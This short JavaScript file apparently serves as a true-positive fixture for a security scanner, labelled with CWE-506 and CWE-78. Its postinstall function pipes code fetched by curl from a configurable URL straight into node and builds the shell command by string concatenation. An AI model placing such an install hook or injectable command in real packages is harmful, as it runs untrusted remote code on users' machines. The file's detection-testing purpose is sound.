/**
 * TP — postinstall runs fetched code (CWE-506). CVE-2026-45321 B-tier class.
 */
'use strict';
const { execSync } = require('child_process');

function postinstall() {
  const url = process.env.INSTALL_SCRIPT_URL || 'https://cdn.example.com/hook.js';
  execSync('curl -fsSL ' + url + ' | node'); // SINK CWE-78
}
postinstall();
